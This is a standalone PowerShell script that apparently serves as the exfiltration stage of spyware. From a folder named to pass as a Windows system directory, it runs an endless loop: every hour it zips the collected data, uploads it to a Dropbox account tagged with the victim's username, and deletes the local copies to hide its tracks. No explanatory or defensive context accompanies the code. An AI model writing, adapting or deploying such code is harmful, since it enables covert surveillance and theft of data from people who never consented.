function SendFilesToDropbox()
{
  foreach($zipfile in (Get-ChildItem -Filter "*.zip").Name )
  {
    $DropboxTargetPath="/${env:USERNAME}_${zipfile}"
    $arg = '{ "path": "' + ${DropboxTargetPath} + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + "YOUR TOKEN DROPBOX"
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", ${authorization})
    $headers.Add("Dropbox-API-Arg", ${arg})
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile ${zipfile} -Headers ${headers}
    
    Remove-Item ${zipfile} -Force
  }
}

#----------------------------------------------------------------------------------------------------------------------------

Set-Location "C:\ProgramData\WindowsUserAssist"
$LastUploadTime = (Get-Date)
$WhatFilesToZip = (Get-Date -Format yyyy_MM_dd_HH\\*)
$ZipArchiveName = (Get-Date -Format yyyy_MM_dd_HH.\zip)

foreach($subdir in (Get-Childitem -Directory).Name)
{
  if( ${subdir} -ne ${WhatFilesToZip}.SubString(0,13) )
  {
    Compress-Archive -Path "${subdir}\*" -CompressionLevel Optimal -DestinationPath "${subdir}.zip"
    Remove-Item ${subdir} -Force -Recurse
  }
}
if (Test-Connection dropbox.com) { SendFilesToDropbox }

while(1)
{
  $CurrentTime = (Get-Date)
  
  if(${LastUploadTime}.Hour -ne ${CurrentTime}.Hour )
  {
	Start-Sleep -Seconds 5
  
    Compress-Archive -Path "${WhatFilesToZip}" -CompressionLevel Optimal -DestinationPath "${ZipArchiveName}"
    Remove-Item ${WhatFilesToZip}.SubString(0,13) -Force -Recurse
    
    if (Test-Connection dropbox.com) { SendFilesToDropbox }
    
    $LastUploadTime = (Get-Date)
    $WhatFilesToZip = (Get-Date -Format yyyy_MM_dd_HH\\*)
    $ZipArchiveName = (Get-Date -Format yyyy_MM_dd_HH.\zip)
  }
  
  Start-Sleep -Seconds 1
}
